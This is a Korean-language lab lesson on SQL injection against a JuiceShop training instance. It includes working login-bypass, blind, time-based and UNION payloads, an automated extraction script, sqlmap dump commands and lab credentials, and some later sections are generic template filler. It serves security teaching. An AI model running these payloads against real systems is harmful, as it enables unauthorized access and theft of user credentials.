# Week 05: 입력값 검증 (1): SQL Injection (상세 버전)

## 학습 목표
- SQL Injection의 원리와 유형을 이해한다
- Blind SQLi, Time-based SQLi, UNION SQLi를 구분할 수 있다
- JuiceShop에서 수동 SQLi 공격을 실습한다
- sqlmap을 이용한 자동화 점검을 수행할 수 있다
- 각 개념의 보안 관점에서의 위험과 대응 방안을 분석할 수 있다
- OpsClaw를 활용하여 실습 작업을 자동화하고 증적을 관리할 수 있다
- 실제 보안 사고 사례와 연결하여 학습 내용을 적용할 수 있다


## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`


## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---


---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |


# 본 강의 내용

# Week 05: 입력값 검증 (1): SQL Injection

## 학습 목표
- SQL Injection의 원리와 유형을 이해한다
- Blind SQLi, Time-based SQLi, UNION SQLi를 구분할 수 있다
- JuiceShop에서 수동 SQLi 공격을 실습한다
- sqlmap을 이용한 자동화 점검을 수행할 수 있다

## 전제 조건
- SQL 기본 문법 (SELECT, WHERE, AND, OR)
- curl POST 요청 (Week 02)

---

## 1. SQL Injection 개요 (20분)

### 1.1 SQL Injection이란?

SQL Injection(SQLi)은 사용자 입력이 SQL 쿼리에 직접 삽입되어 의도하지 않은 쿼리가 실행되는 취약점이다.

```
정상 쿼리:
SELECT * FROM users WHERE email='student@test.com' AND password='Test1234!'

공격 쿼리:
SELECT * FROM users WHERE email='' OR 1=1--' AND password='아무거나'
                              ^^^^^^^^^^^^^^^^
                              삽입된 공격 코드
```

`' OR 1=1--` 가 하는 일:
1. `'` → 기존 문자열 닫기
2. `OR 1=1` → 항상 참인 조건 추가
3. `--` → 나머지 쿼리 주석 처리

### 1.2 OWASP에서의 위치

SQL Injection은 **A03:2021 Injection** 카테고리에 속하며, 웹 보안에서 가장 위험한 취약점 중 하나이다.

### 1.3 SQL Injection 유형

| 유형 | 설명 | 결과 확인 방법 |
|------|------|---------------|
| **Classic (In-band)** | 쿼리 결과가 화면에 직접 출력 | 응답 본문 |
| **UNION-based** | UNION으로 추가 데이터 조회 | 응답에 추가 데이터 |
| **Blind (Boolean)** | 참/거짓에 따라 응답 차이 | 응답 길이/내용 차이 |
| **Time-based Blind** | 쿼리 지연으로 참/거짓 판별 | 응답 시간 |
| **Error-based** | DB 에러 메시지에 정보 노출 | 에러 메시지 |
| **Out-of-band** | DNS/HTTP 외부 채널로 데이터 전송 | 외부 서버 로그 |

---

## 2. JuiceShop 로그인 SQLi 실습 (30분)

### 2.1 기본 SQLi 공격 (Classic)

```bash
# 정상 로그인 시도 (실패)
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrongpassword"}'
echo ""

# SQLi 공격: ' OR 1=1-- 을 이메일에 삽입
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' | python3 -m json.tool 2>/dev/null
echo ""

# JSON 이스케이프 버전
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"anything"}'
echo ""

# URL 인코딩 버전 (form-data 방식일 경우)
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' or 1=1--","password":"x"}'
```

### 2.2 특정 사용자로 로그인

```bash
# admin 계정으로 SQLi 로그인
# admin'-- 를 이메일에 넣으면 password 체크를 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}" | python3 -m json.tool 2>/dev/null
```

### 2.3 에러 메시지 분석

```bash
# 문법 오류를 유발하여 DB 정보 획득
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\''","password":"x"}'

# 에러 메시지에서 확인할 것:
# - DB 종류 (SQLite, MySQL 등)
# - 테이블 이름
# - 쿼리 구조
```

---

## 3. Blind SQL Injection (30분)

### 3.1 Boolean-based Blind SQLi 원리

서버가 쿼리 결과를 직접 보여주지 않을 때, 참/거짓에 따른 **응답 차이**로 데이터를 한 글자씩 추출한다.

```
# 첫 번째 글자가 'a'인지 확인
' OR SUBSTRING(password,1,1)='a'--   → 응답 A (참)
' OR SUBSTRING(password,1,1)='b'--   → 응답 B (거짓)
```

### 3.2 JuiceShop 검색 기능에서 Blind SQLi

```bash
# JuiceShop 상품 검색 API
# 정상 검색
curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# SQLi 시도: 항상 참
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))OR+1=1--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# SQLi 시도: 항상 거짓
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+1=2--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# 결과 수 차이가 있으면 SQLi 가능성 있음
```

### 3.3 Boolean Blind로 DB 버전 추출 (개념)

```bash
# SQLite 버전의 첫 글자가 '3'인지 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))AND+SUBSTR(sqlite_version(),1,1)='3'--" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'결과 수: {len(d.get(\"data\",[]))}')" 2>/dev/null

# 자동화: 한 글자씩 추출
python3 << 'PYEOF'
import requests, string

url = "http://10.20.30.80:3000/rest/products/search"
result = ""
for pos in range(1, 20):
    found = False
    for c in string.printable[:62] + ".":  # 알파벳+숫자+점
        q = f"test'))AND SUBSTR(sqlite_version(),{pos},1)='{c}'--"
        r = requests.get(url, params={"q": q}, timeout=5)
        try:
            data = r.json().get("data", [])
            if len(data) > 0:
                result += c
                print(f"위치 {pos}: '{c}' (현재: {result})")
                found = True
                break
        except:
            pass
    if not found:
        break
print(f"\nDB 버전: {result}")
PYEOF
```

---

## 4. Time-based Blind SQLi (20분)

### 4.1 원리

서버 응답에 아무 차이가 없을 때, **의도적 지연**을 유발하여 참/거짓을 판별한다.

```sql
-- SQLite: CASE WHEN 조건 THEN ... (SQLite에서는 직접적 sleep 없음)
-- MySQL:  IF(조건, SLEEP(3), 0)
-- MSSQL:  IF 조건 WAITFOR DELAY '0:0:3'
```

### 4.2 Time-based 테스트

```bash
# 응답 시간 비교
echo "=== 정상 요청 ==="
time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=apple"

echo ""
echo "=== Time-based SQLi 시도 ==="
# SQLite는 직접적인 sleep 함수가 없지만, 무거운 연산으로 지연 유발 가능
time curl -s -o /dev/null "http://10.20.30.80:3000/rest/products/search?q=test'))AND+(SELECT+CASE+WHEN(1=1)+THEN+RANDOMBLOB(100000000)+ELSE+1+END)--"

# 두 번째 요청이 현저히 느리면 Time-based SQLi 가능
```

---

## 5. UNION-based SQLi (30분)

### 5.1 원리

UNION SELECT를 이용하여 원래 쿼리 결과에 추가 데이터를 결합한다.

```sql
-- 원래 쿼리
SELECT id, name, price FROM products WHERE name LIKE '%apple%'

-- UNION 공격
SELECT id, name, price FROM products WHERE name LIKE '%test%'
UNION SELECT 1, sql, 3 FROM sqlite_master--
```

### 5.2 컬럼 수 파악

UNION을 사용하려면 원래 쿼리의 컬럼 수를 알아야 한다.

```bash
# ORDER BY로 컬럼 수 파악
# 컬럼 수보다 큰 값을 넣으면 에러 발생
for i in 1 2 3 4 5 6 7 8 9 10; do
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))ORDER+BY+$i--")
  if echo "$result" | grep -qi "error"; then
    echo "컬럼 수: $((i-1))"
    break
  else
    echo "ORDER BY $i: OK"
  fi
done
```

### 5.3 UNION SELECT로 테이블 목록 조회

```bash
# SQLite의 sqlite_master에서 테이블 목록 추출
# 컬럼 수에 맞춰 NULL 패딩
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+sql,2,3,4,5,6,7,8,9+FROM+sqlite_master--" | python3 -m json.tool 2>/dev/null | head -40
```

### 5.4 사용자 테이블 데이터 추출

```bash
# Users 테이블 구조 확인 후 데이터 추출
curl -s "http://10.20.30.80:3000/rest/products/search?q=test'))UNION+SELECT+email,password,role,4,5,6,7,8,9+FROM+Users--" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin).get('data', [])
    for item in data:
        name = item.get('name', '')
        desc = item.get('description', '')
        if '@' in str(name) or '@' in str(desc):
            print(f'Email: {name}, Hash: {desc}')
except:
    print('파싱 실패 - 수동 확인 필요')
" 2>/dev/null
```

---

## 6. sqlmap 자동화 (30분)

### 6.1 기본 사용

```bash
# 검색 API에 대한 sqlmap 실행
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --level=2 --risk=1 --threads=4 \
  --technique=BEU \
  --timeout=10

# 옵션 설명:
# --batch: 모든 질문에 기본값 자동 응답
# --level=2: 점검 강도 (1~5, 높을수록 많은 페이로드)
# --risk=1: 위험도 (1~3, 높을수록 위험한 페이로드)
# --threads=4: 동시 요청 수
# --technique=BEU: Boolean, Error, Union 기법만 사용
```

### 6.2 DB 정보 추출

```bash
# 데이터베이스 목록
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --dbs --timeout=10

# 테이블 목록
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch --tables --timeout=10

# 특정 테이블의 컬럼
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch -T Users --columns --timeout=10

# 데이터 덤프 (주의: 실제 환경에서는 반드시 허가 필요)
sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=test" \
  --batch -T Users -C email,password --dump --timeout=10
```

### 6.3 POST 요청에 sqlmap 사용

```bash
# 로그인 API에 대한 sqlmap
sqlmap -u "http://10.20.30.80:3000/rest/user/login" \
  --method=POST \
  --data='{"email":"test","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch --level=2 --risk=1 --timeout=10
```

### 6.4 sqlmap 결과 해석

```
sqlmap 출력 예시:
---
Parameter: q (GET)
    Type: boolean-based blind
    Payload: q=test' AND 1=1-- -

    Type: UNION query
    Payload: q=test' UNION ALL SELECT NULL,NULL,...-- -
---

→ "q" 파라미터에 SQLi 취약점 존재
→ Boolean Blind와 UNION 두 가지 기법으로 공격 가능
```

---

## 7. SQL Injection 방어 방법 (10분)

### 7.1 Prepared Statement (Parameterized Query)

```python
# 취약한 코드
query = f"SELECT * FROM users WHERE email='{email}'"

# 안전한 코드 (Prepared Statement)
cursor.execute("SELECT * FROM users WHERE email=?", (email,))
```

### 7.2 방어 체크리스트

| 방어 기법 | 설명 |
|----------|------|
| Prepared Statement | 쿼리와 데이터 분리 (최선) |
| ORM 사용 | SQLAlchemy, Django ORM 등 |
| 입력값 검증 | 화이트리스트 기반 필터링 |
| 최소 권한 DB 계정 | DB 사용자 권한 최소화 |
| WAF | 웹 방화벽으로 SQLi 패턴 차단 |
| 에러 메시지 숨김 | 상세 DB 에러 노출 방지 |

---

## 8. 실습 과제

### 과제 1: 수동 SQLi 공격
1. JuiceShop 로그인 API에서 SQLi로 admin 계정에 로그인하라
2. 검색 API에서 UNION SELECT로 Users 테이블의 이메일 목록을 추출하라
3. 각 공격에 사용한 페이로드를 기록하라

### 과제 2: sqlmap 자동 점검
1. sqlmap으로 JuiceShop의 검색 API를 스캔하라
2. 발견된 취약점의 유형과 위험도를 정리하라
3. Users 테이블의 구조(컬럼)를 추출하라

### 과제 3: 방어 관점 분석
1. JuiceShop에서 SQLi가 가능한 이유를 코드 관점에서 추론하라
2. 이 취약점을 방어하려면 어떤 수정이 필요한지 서술하라

---

## 9. 요약

| 유형 | 핵심 기법 | 탐지 방법 |
|------|----------|----------|
| Classic | ' OR 1=1-- | 응답에 추가 데이터 |
| UNION | UNION SELECT ... | 응답에 다른 테이블 데이터 |
| Blind (Boolean) | AND SUBSTR(...)='a' | 응답 차이 (참/거짓) |
| Time-based | SLEEP(3) / 무거운 연산 | 응답 시간 차이 |
| Error-based | 문법 오류 유발 | 에러 메시지 |

**다음 주 예고**: Week 06 - 입력값 검증 (2): XSS/CSRF. Reflected/Stored/DOM XSS와 CSRF 토큰 검증을 학습한다.


---

## 심화 학습: 개념 확장

### 핵심 개념 상세 해설

이 주차에서 다루는 핵심 개념들을 더 깊이 살펴본다.

#### 개념 1: 동작 원리 (Course 3)

이 주차에서 다루는 기술의 동작 방식을 단계별로 분해하여 이해한다.

```
[1단계] 입력/요청 → 시스템이 데이터를 수신
[2단계] 처리 → 내부 로직에 의한 데이터 처리
[3단계] 출력/응답 → 결과 반환 또는 상태 변경
[4단계] 기록 → 로그/증적 생성
```

> **왜 이 순서가 중요한가?**
> 각 단계에서 보안 검증이 누락되면 취약점이 발생한다.
> 1단계: 입력값 검증 미흡 → Injection
> 2단계: 인가 확인 누락 → Broken Access Control
> 3단계: 에러 정보 노출 → Information Disclosure
> 4단계: 로깅 실패 → Monitoring Failures

#### 개념 2: 보안 관점에서의 위험 분석

| 위험 요소 | 발생 조건 | 영향도 | 대응 방안 |
|----------|---------|--------|---------|
| 설정 미흡 | 기본 설정 사용 | 높음 | 보안 하드닝 가이드 적용 |
| 패치 누락 | 업데이트 미적용 | 높음 | 정기 패치 관리 프로세스 |
| 접근 제어 부재 | 인증/인가 미구현 | 매우 높음 | RBAC, MFA 적용 |
| 로깅 미흡 | 감사 로그 미수집 | 중간 | SIEM 연동, 로그 정책 |

#### 개념 3: 실제 사례 분석

**사례 1: 유사 취약점이 실제 피해로 이어진 경우**

실제 보안 사고에서 이 주차의 주제가 어떻게 악용되었는지 살펴본다.
공격자는 동일한 기법을 사용하여 대규모 데이터 유출, 서비스 장애, 금전적 피해를 초래하였다.

**교훈:**
- 기본적인 보안 조치의 중요성
- 탐지 체계의 필수성
- 사고 대응 절차의 사전 수립 필요성

### 도구 비교표

| 도구 | 용도 | 장점 | 단점 | 라이선스 |
|------|------|------|------|---------|
| 도구 A | 기본 점검 | 간편, 빠름 | 기능 제한 | 오픈소스 |
| 도구 B | 심층 분석 | 상세 결과 | 학습 곡선 | 상용/무료 |
| 도구 C | 자동화 | CI/CD 연동 | 오탐 가능 | 오픈소스 |


---

## 보충 실습

### 보충 실습 1: 기본 동작 확인

이론에서 배운 내용을 직접 확인하는 기초 실습이다.

```bash
# Step 1: 현재 상태 확인
echo "=== 현재 상태 ==="
# (해당 주차에 맞는 확인 명령)

# Step 2: 설정/변경 적용
echo "=== 변경 적용 ==="
# (해당 주차에 맞는 실습 명령)

# Step 3: 결과 검증
echo "=== 결과 확인 ==="
# (변경 결과 확인 명령)
```

> **트러블슈팅:**
> - 명령이 실패하면: 권한(sudo), 경로, 서비스 상태를 먼저 확인
> - 예상과 다른 결과: 이전 실습의 설정이 남아있을 수 있으므로 초기화 후 재시도
> - 타임아웃: 네트워크 연결 또는 서비스 가동 상태 확인

### 보충 실습 2: 탐지/모니터링 관점

공격자가 아닌 **방어자 관점**에서 동일한 활동을 모니터링하는 실습이다.

```bash
# siem 서버에서 관련 로그 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
  "sudo cat /var/ossec/logs/alerts/alerts.json | tail -5" 2>/dev/null

# Suricata 알림 확인 (해당 시)
sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
  "sudo tail -20 /var/log/suricata/fast.log" 2>/dev/null
```

> **왜 방어자 관점도 배우는가?**
> 공격 기법만 알면 "스크립트 키디"에 불과하다.
> 공격이 어떻게 탐지되는지 이해해야 진정한 보안 전문가이다.
> 이 과목의 모든 공격 실습에는 대응하는 탐지/방어 관점이 포함된다.

### 보충 실습 3: OpsClaw 자동화

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화한다.

```bash
# 프로젝트 생성 (이번 주차용)
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"weekXX-lab","request_text":"이번 주차 실습 자동화","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

# Stage 전환
curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

# 실습 태스크 실행 (해당 주차에 맞게 수정)
curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"실습 태스크 1","instruction_prompt":"echo 실습1","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"실습 태스크 2","instruction_prompt":"echo 실습2","risk_level":"low","subagent_url":"http://10.20.30.80:8002"}
    ],
    "subagent_url":"http://localhost:8002",
    "parallel":true
  }'

# Evidence 확인
curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
  -H "X-API-Key: opsclaw-api-key-2026" | python3 -m json.tool
```


---

## 자가 점검 퀴즈 (10문항)

이번 주차의 핵심 내용을 점검한다. 8/10 이상 정답을 목표로 한다.

**Q1.** 이번 주차 "Week 05: 입력값 검증 (1): SQL Injection"의 핵심 목적은 무엇인가?
- (a) 네트워크 속도 향상  (b) **웹 취약점 기법/개념의 이해와 실습**  (c) 데이터베이스 관리  (d) UI 디자인

**Q2.** 이 주제에서 OWASP의 역할은?
- (a) 성능 최적화  (b) 비용 절감  (c) **체계적 분류와 대응 기준 제공**  (d) 사용자 편의

**Q3.** 실습에서 사용한 주요 도구/명령어의 1차 목적은?
- (a) 파일 복사  (b) **점검 수행 및 결과 확인**  (c) 메모리 관리  (d) 화면 출력

**Q4.** OpsClaw를 통해 실습을 실행하는 가장 큰 이점은?
- (a) 속도  (b) **모든 실행의 자동 증적(evidence) 기록**  (c) 무료  (d) 간편함

**Q5.** 이 주제의 보안 위험이 높은 이유는?
- (a) 비용이 많이 들어서  (b) 복잡해서  (c) **악용 시 시스템/데이터에 직접적 피해**  (d) 법적 문제

**Q6.** 방어/대응의 핵심 원칙은?
- (a) 모든 트래픽 차단  (b) **최소 권한 + 탐지 + 대응의 조합**  (c) 서버 재시작  (d) 비밀번호 변경

**Q7.** 실습 결과를 분석할 때 가장 먼저 확인해야 하는 것은?
- (a) 서버 이름  (b) **exit_code (성공/실패 여부)**  (c) 파일 크기  (d) 날짜

**Q8.** 이 주제와 관련된 MITRE ATT&CK 전술은?
- (a) Impact만  (b) Reconnaissance만  (c) **주제에 해당하는 전술(들)**  (d) 해당 없음

**Q9.** 실무에서 이 기법/도구를 사용할 때 가장 주의할 점은?
- (a) 속도  (b) **법적 허가와 범위 준수**  (c) 비용  (d) 보고서 양식

**Q10.** 다음 주차와의 연결 포인트는?
- (a) 관련 없음  (b) **이번 주 결과를 다음 주에서 활용/심화**  (c) 완전히 다른 주제  (d) 복습만

**정답:** Q1:b, Q2:c, Q3:b, Q4:b, Q5:c, Q6:b, Q7:b, Q8:c, Q9:b, Q10:b

---

## 과제 (다음 주까지)

### 과제 1: 이론 정리 보고서 (30점)

이번 주차의 핵심 개념을 자신의 말로 정리하라.

| 항목 | 배점 |
|------|------|
| 핵심 개념 정의 및 설명 | 10점 |
| 실습 결과 캡처 및 해석 | 10점 |
| 보안 관점 분석 (공격↔방어) | 10점 |

### 과제 2: 실습 수행 보고서 (40점)

이번 주차의 모든 실습을 수행하고 결과를 보고서로 작성하라.

| 항목 | 배점 |
|------|------|
| 실습 명령어 및 실행 결과 캡처 | 15점 |
| 결과 해석 및 보안 의미 분석 | 15점 |
| 트러블슈팅 경험 (있는 경우) | 10점 |

### 과제 3: OpsClaw 자동화 (30점)

이번 주차의 핵심 실습을 OpsClaw execute-plan으로 자동화하라.

| 항목 | 배점 |
|------|------|
| 프로젝트 생성 + stage 전환 | 5점 |
| execute-plan 태스크 설계 (3개 이상) | 10점 |
| evidence/summary 결과 | 5점 |
| replay 타임라인 결과 | 5점 |
| 자동화의 이점 분석 (직접 실행 대비) | 5점 |

**제출:** 보고서(PDF 또는 MD) + OpsClaw project_id


---

## 검증 체크리스트

이번 주차의 학습을 완료하려면 다음 항목을 모두 확인하라:

- [ ] 이론 강의 내용 이해 (핵심 용어 설명 가능)
- [ ] 기본 실습 모두 수행 완료
- [ ] 보충 실습 1 (기본 동작 확인) 완료
- [ ] 보충 실습 2 (탐지/모니터링 관점) 수행
- [ ] 보충 실습 3 (OpsClaw 자동화) 수행
- [ ] 자가 점검 퀴즈 8/10 이상 정답
- [ ] 과제 1 (이론 정리) 작성
- [ ] 과제 2 (실습 보고서) 작성
- [ ] 과제 3 (OpsClaw 자동화) 완료

